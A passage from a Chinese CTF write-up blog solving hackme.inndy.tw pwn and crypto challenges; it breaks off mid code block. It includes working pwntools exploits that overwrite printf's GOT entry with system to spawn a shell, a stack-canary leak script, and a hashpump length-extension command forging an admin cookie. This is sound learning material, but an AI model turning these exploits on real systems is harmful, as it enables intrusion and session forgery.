<span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(&amp;s, <span class="string">"exit\n"</span>) );</span><br><span class="line">  system(<span class="string">"echo Goodbye"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwnlib.gdb.context.terminal = [<span class="string">'konsole'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = process(<span class="string">'./echo'</span>)</span><br><span class="line"><span class="comment"># io = remote('hackme.inndy.tw', 7711)</span></span><br><span class="line">elf = ELF(<span class="string">'./echo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 没有开ASLR, 可以直接从 elf 中读取 plt </span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'printf_got: &#123;:#x&#125;'</span>.format(printf_got))</span><br><span class="line">log.info(<span class="string">'system_plt: &#123;:#x&#125;'</span>.format(system_plt))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got: system_plt&#125;)</span><br><span class="line">log.info(<span class="string">'payload: '</span> + payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>第一次做出格式化字符串的题, 看了半天CTF wiki, 终于明白原理了.</p><p>利用格式化字符串可以做到任意地址读写, 基本思路是先泄露 system 地址.<br>然后把 GOT 表中 printf 的地址替换为 system 的. 这样第二步输入 <code>/bin/sh</code>就可以 getshell 了</p><p>补充: 记录一下原理免得自己忘记. 首先我们的格式化字符串是在栈上的, 并且相对与 printf 的 ebp 的位置应该是不变的. 所以我们可以在本地调试的时候确定格式化字符串的位置,</p><p>然后使用 %n$p 这种方式就能输出格式换字符串本身了(当然一次只有4个字节, 而且是hex形式).</p><p>如果使用 %n$s 的话, 就能把这个位置的数据解释为地址, 然后将这个地址的内容当做字符串取出.<br>如果使用 %n$n 的话, 就能把这个位置的数据解释为地址, 然后往这个地址写入当前已输出的字符数.</p><p>至于 n 的值, 可以通过输入 <code>AAAA%p%p%p...</code> 这样的字符串, 然后在输出中寻找 <code>0x41414141</code> 来定位, 也可以直接 gdb 在 printf 处下断点, 然后 <code>stack 20</code> 先把栈打印出来, 再寻找.</p><h2 id="echo2"><a class="headerlink" href="#echo2"></a>echo2</h2><blockquote><p>nc <a href="http://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy.tw</a> 7712<br>Tips: ASLR enabled</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec echo2</span><br><span class="line">[*] &apos;/home/aloxaf/CTF/echo2&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>和上一题主要有两个不同, 一个是64位, 另一个是开启了ASLR</p><p>先执行一下, 输入 <code>AAAAAAAA%p%p%p%p%p%p%p%p</code> 根据结果 <code>AAAAAAAA0x7fa5b1b827300x7fff524033000xfbad208b0x7fa5b1b815c00x7fa5b1b827200x4141 4141414141410x70257025702570250x7025702570257025</code> 可以判断出偏移是6.</p><p>这题做了很久, 最后看了下 M4x 师傅的博客, 得知可以泄露 main 和  __libc_start_main 的地址, 继而计算出基址, 然后就可以覆写 GOT 来 get shell 了.</p><p>调试判断出距离 <code>main+74</code> 的偏移是41, <code>__libc_start_main+243</code> 的偏移是 43</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">pwnlib.gdb.context.terminal = [<span class="string">'konsole'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context(log_level=<span class="string">'DEBUG'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process('./echo2', env=&#123;"LD_PRELOAD": "./libc-2.23.so.x86_64"&#125;)</span></span><br><span class="line">io = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7712</span>)</span><br><span class="line">elf = ELF(<span class="string">'./echo2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(io, 'b printf')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露 main 函数基址, __libc_start_main 基址</span></span><br><span class="line">io.sendline(<span class="string">'%41$p %43$p'</span>)</span><br><span class="line">main_addr, libc_addr = (int(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> io.recv().split())</span><br><span class="line">main_addr -= <span class="number">74</span></span><br><span class="line">libc_addr -= <span class="number">240</span></span><br><span class="line">log.info(<span class="string">'main_addr: &#123;:#x&#125;'</span>.format(main_addr))</span><br><span class="line">log.info(<span class="string">'libc_addr: &#123;:#x&#125;'</span>.format(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 libc 基址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>, libc_addr)</span><br><span class="line">libc_base = libc_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">log.info(<span class="string">'libc_base: &#123;:#x&#125;'</span>.format(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 elf 基址</span></span><br><span class="line">elf_offset = main_addr - elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"><span class="comment"># 得到 printf_got 地址</span></span><br><span class="line">printf_got = elf_offset + elf.got[<span class="string">'printf'</span>]</span><br><span class="line">log.info(<span class="string">'printf_got: &#123;:#x&#125;'</span>.format(printf_got))</span><br><span class="line"><span class="comment"># 得到 system 地址</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(<span class="string">'system_addr: &#123;:#x&#125;'</span>.format(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位没法使用 fmtstr_payload, 因为默认把地址放在前面会导致大概率被 \x00 截断</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str_payload64</span><span class="params">(offset, src, data)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成 64 位格式化字符串payload</span></span><br><span class="line"><span class="string">    offset: 偏移</span></span><br><span class="line"><span class="string">    src: 源地址</span></span><br><span class="line"><span class="string">    data: 欲写入内容</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload1, payload2 = [], []</span><br><span class="line">    addr = [[ord(v), i] <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(p64(data)[:<span class="number">-2</span>])] <span class="comment"># 最后两位一般是 \x00</span></span><br><span class="line">    addr = sorted(addr)</span><br><span class="line">    chr_cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate(addr):</span><br><span class="line">        payload1.append(<span class="string">'%&#123;:02&#125;c%&#123;&#125;$hhn'</span>.format(value[<span class="number">0</span>]-chr_cnt, offset+<span class="number">9</span>+index))</span><br><span class="line">        payload2.append(src+value[<span class="number">1</span>])</span><br><span class="line">        chr_cnt = value[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用 '_' 对齐</span></span><br><span class="line">    <span class="keyword">return</span> flat(payload1 + [<span class="string">'_'</span> * <span class="number">6</span>] + payload2)</span><br><span class="line"></span><br><span class="line">payload = fmt_str_payload64(<span class="number">6</span>, printf_got, system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>这个地方有个坑点就是 240 这个数, 和 libc 的版本相关...<br>问了 M4x 师傅才知道, 我果然还是太 naive 了</p><h2 id="echo3"><a class="headerlink" href="#echo3"></a>echo3</h2><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7720</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➤ checksec echo3</span><br><span class="line">[*] &apos;/home/aloxaf/CTF/echo3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>这道题的难点主要是缓冲区不在栈上, 而是在堆上.</p><p>这极大地限制了任意地址读写的能力, 基本上只能靠<code>%$n</code>来读写当前栈里的数据.</p><h2 id="smashthestack"><a class="headerlink" href="#smashthestack"></a>smashthestack</h2><blockquote><p>nc <a href="http://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy.tw</a> 7717</p><p>Tips: stderr is available, beware of the output</p></blockquote><p>Canary 和 NX 都开了, <s>本来注意到如下代码, 想着能不能让 buf 为 0xFFFFFFFF 然后一直泄露到堆上.</s></p><p><s>一直失败, 后来冷静分析才意识到这段内存不一定全部都能访问, 而且 0xFFFFFFFF bytes = 4 GiB. 怎么可能这样泄露...</s></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Try to read the flag\n"</span>, <span class="number">0x15</span>u);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x10000</span>u);</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, buf, *(<span class="keyword">size_t</span> *)buf);</span><br></pre></td></tr></table></figure><p>于是又跑去看 M4x 师傅的博客, 看到了这篇文章:  <a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">论canary的几种玩法</a></p><p>非常硬却失挺的方法, 学习了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">gdb.context.terminal = [<span class="string">'konsole'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7717</span>)</span><br><span class="line"><span class="comment"># io = process('./smash-the-stack')</span></span><br><span class="line">ex = ELF(<span class="string">'./smash-the-stack'</span>)</span><br><span class="line">buff_addr = ex.symbols[<span class="string">'buff'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">io.send(p32(buff_addr) * <span class="number">50</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="crypto"><a class="headerlink" href="#crypto"></a>Crypto</h1><h2 id="easy"><a class="headerlink" href="#easy"></a>easy</h2><blockquote><p>526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d</p></blockquote><p>unhexlify + base64</p><h2 id="r-u-kidding"><a class="headerlink" href="#r-u-kidding"></a>r u kidding</h2><blockquote><p>EKZF{Hs'r snnn dzrx, itrs bzdrzq bhogdq}</p></blockquote><p>凯撒</p><h2 id="not-harder"><a class="headerlink" href="#not-harder"></a>not harder</h2><blockquote><p>Nm@rmLsBy{Nm5u-K{iZKPgPMzS2I<em>lPc%_SMOjQ#O;uV{MM</em>?PPFhk|Hd;hVPFhq{HaAH&lt;<br>Tips: pydoc3 base64</p></blockquote><p>base85 + base32</p><h2 id="classic-cipher-1"><a class="headerlink" href="#classic-cipher-1"></a>classic cipher 1</h2><blockquote><p>MTHJ{CWTNXRJCUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}<br>Solve this substitution cipher</p></blockquote><p>替代密码, 随便找个网站跑一下, 再冷静分析一下, 应该不成问题</p><h2 id="classic-cipher-2"><a class="headerlink" href="#classic-cipher-2"></a>classic cipher 2</h2><blockquote><p>Solve this vigenere cipher</p></blockquote><p>随便搜一搜找个工具就行了....</p><p>开始用自己的工具解, 一直解不出,<br>后来才发现自己设的最大秘钥长度刚好比这个秘钥小了一位orz</p><h2 id="easy-aes"><a class="headerlink" href="#easy-aes"></a>easy AES</h2><blockquote><p>Can you encrypt things with AES?<br>Tips: What is symmetric cipher?</p></blockquote><p>对称加密, 加解密秘钥是同一个</p><h2 id="one-time-padding"><a class="headerlink" href="#one-time-padding"></a>one time padding</h2><blockquote><p>You will never see flag?!</p></blockquote><p>这题目想了半天没想通, 题目采用了随机等长密钥, 使得字频分析失效. 感觉非常牢不可破的样子, 后来去搜 writeup 才明白...</p><p>注意到一行注释: <code>// X ^ 0 = X, so we want to avoid null byte to keep your secret safe :)</code></p><p>这意味着, 密文中不会出现明文中有的字符...那么只要收集到足够的密文然后统计就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://hackme.inndy.tw/otp/?issue_otp=illya'</span></span><br><span class="line"></span><br><span class="line">ciphers = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    ciphers += requests.get(url).text</span><br><span class="line"></span><br><span class="line">b = [number.long_to_bytes(int(i, <span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> ciphers.split()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(len(b[<span class="number">0</span>])):</span><br><span class="line">    c = set(range(<span class="number">256</span>)) - set([i[_] <span class="keyword">for</span> i <span class="keyword">in</span> b])</span><br><span class="line">    <span class="keyword">if</span> len(c) == <span class="number">1</span>:</span><br><span class="line">        print(chr(c.pop()), end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">''</span>)</span><br><span class="line">        print(bytes(c))</span><br></pre></td></tr></table></figure><p>然而很迷的是跑出来的 FLAG 不完整...好在能够猜出来</p><h2 id="shuffle"><a class="headerlink" href="#shuffle"></a>shuffle</h2><blockquote><p>I have shuffled my text file, can you recover it?</p></blockquote><p>脚本逻辑很简单, 一段明文, 两种加密方式, 一是对明文做一个随机的替代密码存起来, 二是把明文打乱存起来.</p><p>统计字频可以还原出替代密码表, 然后就可以大致还原出明文了(个别符号的出现次数可能相等).</p><h2 id="login-as-admin-2"><a class="headerlink" href="#login-as-admin-2"></a>login as admin 2</h2><blockquote><p>Please login as admin. Tips: length extension attack</p></blockquote><p>题目提示是长度扩展攻击</p><p>Google了一下, 原理没看懂, <s>工具倒是找到了</s></p><p>注意到得到 flag 的条件是 <code>$user['admin']</code>为 true, 也就是说对用户名并没有要求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($user[<span class="string">'admin'</span>]) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;"</span>, htmlentities($flag)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析设置 cookie 的代码, 得知 cookie 内容为 <code>$sig#$serialized</code>, 以 guest 为例, 内容为 <code>6bcb9c9155975a53e951b0b50f137480#name=guest&amp;admin=0</code></p><p>只要能够修改 admin 为非 0 值, 就能得到 flag.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">($user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line"></span><br><span class="line">    $user = [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $user_data[<span class="string">'name'</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $user_data[<span class="string">'admin'</span>]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $serialized = http_build_query($user);</span><br><span class="line">    $sig = md5(md5($secret).$serialized);</span><br><span class="line">    $all = base64_encode(<span class="string">"&#123;$sig&#125;#&#123;$serialized&#125;"</span>);</span><br><span class="line">    setcookie(<span class="string">'user'</span>, $all, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而 cookie 有验证过程, cookie 通过验证的条件是: <code>md5(md5($secret).$serialized) == $sig</code>, 如果知道 <code>$secret</code> 的值的话, 就很简单了, 然而并不知道...</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list</span>($sig, $serialized) = explode(<span class="string">'#'</span>, base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(md5(md5($secret).$serialized) !== $sig) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parse_str($serialized, $user);</span><br><span class="line">    <span class="keyword">return</span> $user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候就要用到 <em>哈希长度扩展攻击</em> 了</p><blockquote><p>哈希长度扩展攻击(Hash Length Extension Attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在<strong>消息与密钥的长度已知</strong>的情形下，所有采取了 H(key ∥ message) 此类构造的散列函数。MD5和SHA-1 等基于 Merkle–Damgård 构造的算法均对此类攻击显示出脆弱性。</p><p>这类哈希函数有以下特点</p><ul><li>消息填充方式都比较类似，首先在消息后面添加一个1，然后填充若干个0，直至总长度与 448 同余，最后在其后附上64位的消息长度（填充前）。</li><li>每一块得到的链接变量都会被作为下一次执行hash函数的初始向量IV。在最后一块的时候，才会将其对应的链接变量转换为hash值。</li></ul><p>一般攻击时应满足如下条件</p><ul><li>我们已知 key 的长度，如果不知道的话，需要爆破出来</li><li>我们可以控制 message 的消息。</li><li>我们已经知道了包含 key 的一个消息的hash值。</li></ul><p>这样我们就可以得到一对(messge,x)满足x=H(key ∥ message)虽然我们并不清楚key的内容。</p><p>--- CTF Wiki</p></blockquote><p>简要地讲, 如果已知 <code>$key</code> 的长度和 <code>$mes</code> 的内容和 <code>md5($key.$mes)</code> 的值, 利用 <em>哈希长度扩展攻击</em> , 就可以构造一个 <code>$pad</code>, 使得我们可以获取 <code>md5($key.$mes.$pad.$mes2)</code> 的值, 其中 <code>$mes2</code>是自定义的信息.</p><p>以 hashdump 和马猴烧酒为例, 用如下命令可以得到新的 <code>$sig</code> 和 <code>$serialized</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">▶ hashpump -s 6bcb9c9155975a53e951b0b50f137480 -d &apos;name=guest&amp;admin=0&apos; -a &apos;illya&apos; -k 32</span><br><span class="line">4b6fe69cd0880b2e01e609d8ed9fd30a</span><br><span class="line">name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00illya</span><br></pre></td></tr></table></figure><p>比较迷的一点是, 一开始在 Chrome 里直接改 Cookie 然后刷新似乎不行 = =. 最后用 httpie 提交才获得了 flag. orz</p><h2 id="xor"><a class="headerlink" href="#xor"></a>xor</h2><blockquote><p>I've X0Red some file, could you recover it?</p></blockquote><p>以前写过工具, 利用重合指数法攻击</p><h2 id="emoji"><a class="headerlink" href="#emoji"></a>emoji</h2><blockquote><p>(´・ω・`)</p></blockquote><p>chrome 直接打开编码有问题, curl 看看.<br>然后复制到搜到的解密工具 <a href="https://tool.lu/js/" target="_blank" rel="noopener">https://tool.lu/js/</a> 里得到源码).</p><p>代码逻辑不难, 加密部分直接爆破就行. 需要注意的是程序在 nodejs 环境下才能运行.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (i * <span class="number">0xb1</span> + <span class="number">0x1b</span>) &amp; <span class="number">0xff</span> == n:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">print(bytes([crack(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> crypted]).decode())</span><br></pre></td></tr></table></figure><p>得到后直接放参数里运行</p><h2 id="ffa"><a class="headerlink" href="#ffa"></a>ffa</h2><blockquote><p>finite field arithmetic</p></blockquote><p>有限域算法? 看不懂, 先无脑上z3. 根据代码来看第一步应该是还原出 a, b, c 的值.</p><p>一开始直接用Int类型跑半天没跑出结果, 后来看了 M4x 师傅的博客才知道BitVec更快orz,  算一算最大262位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> json.load(open(<span class="string">'crypted'</span>)).items():</span><br><span class="line">    globals()[k] = v</span><br><span class="line">    </span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">a, b, c = BitVecs(<span class="string">'a b c'</span>, <span class="number">262</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> [a, b, c]:</span><br><span class="line">    solver.add(_ &gt;= pow(<span class="number">2</span>, <span class="number">256</span>, m))</span><br><span class="line">    solver.add(_ &lt; pow(<span class="number">2</span>, <span class="number">257</span>, m))</span><br><span class="line">solver.add((a + b * <span class="number">3</span>) % m == x)</span><br><span class="line">solver.add((b - c * <span class="number">5</span>) % m == y)</span><br><span class="line">solver.add((a + c * <span class="number">8</span>) % m == z)</span><br><span class="line"></span><br><span class="line">models = []</span><br><span class="line"><span class="keyword">while</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    print(m)</span><br><span class="line">    models.append(m)</span><br><span class="line">    solver.add(Or(a != m[a], b != m[b], c != m[c]))</span><br></pre></td></tr></table></figure><p>这次还好, 只有一组值.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = pow(flag, a, M)</span><br><span class="line">q = pow(flag, b, M)</span><br></pre></td></tr></table></figure><p>于是现在变成了已知 p, q, a, b, M, 求 flag.  <s>气氛突然 RSA 了起来.</s></p><p>和 RSA 的共模攻击很像,  <s>照着 CTF wiki  的代码抄一遍</s></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 